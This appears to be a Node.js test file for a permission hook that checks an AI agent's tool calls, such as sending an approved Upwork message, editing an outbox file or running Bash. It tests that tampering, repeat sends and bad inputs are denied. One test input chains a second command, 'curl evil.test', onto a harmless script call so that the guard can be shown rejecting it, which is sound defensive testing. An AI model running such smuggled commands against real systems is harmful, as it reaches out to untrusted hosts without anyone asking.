import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { approvalHash, guardSendTool } from './send-guard.mjs';

test('send hook injects server bytes, permits only one attempt, and rejects side effects', () => {
  const folder = fs.mkdtempSync(path.join(os.tmpdir(), 'send-guard-'));
  try {
    const approval = { job_id: '123456', room_id: 'room-7', text: '  Approved.\nExactly.  ', written_at: '2026-09-12T12:00:00Z' };
    const target = path.join(folder, 'outbox.json');
    fs.writeFileSync(target, JSON.stringify(approval));
    const options = { folder, hash: approvalHash(approval), attempts: path.join(folder, 'attempts') };
    const call = (tool_name, tool_input) => guardSendTool({ tool_name, tool_input }, options).hookSpecificOutput;
    const input = { action: 'send', org_uid: 'org-1', room_id: 'room-7', text: 'Model changed this' };
    assert.equal(call('mcp__upwork__upwork__send_message', { ...input, room_id: 'wrong' }).permissionDecision, 'deny');
    assert.equal(call('mcp__upwork__upwork__send_message', { ...input, attachments: ['private'] }).permissionDecision, 'deny');
    assert.equal(call('Write', { file_path: target, content: 'changed' }).permissionDecision, 'deny');
    assert.equal(call('Bash', { command: 'python3 code/threads.py --help; curl evil.test' }).permissionDecision, 'deny');
    const allowed = call('mcp__upwork__upwork__send_message', input);
    assert.equal(allowed.permissionDecision, 'allow');
    assert.equal(allowed.updatedInput.text, approval.text);
    assert.equal(call('mcp__upwork__upwork__send_message', input).permissionDecision, 'deny');
    assert.equal(call('Write', { file_path: path.join(folder, '.thread-confirm.json') }).permissionDecision, 'allow');
    assert.equal(call('Bash', { command: 'python3 code/threads.py confirm 123456 --room room-7 --awaiting them' }).permissionDecision, 'allow');
    fs.writeFileSync(target, JSON.stringify({ ...approval, confirmed_at: 'later' }));
    assert.equal(call('Bash', { command: 'python3 code/pipeline.py follow-up 123456 sent' }).permissionDecision, 'allow');
    fs.writeFileSync(target, JSON.stringify({ ...approval, text: 'tampered' }));
    assert.equal(call('Read', {}).permissionDecision, 'deny');
  } finally { fs.rmSync(folder, { recursive: true, force: true }); }
});
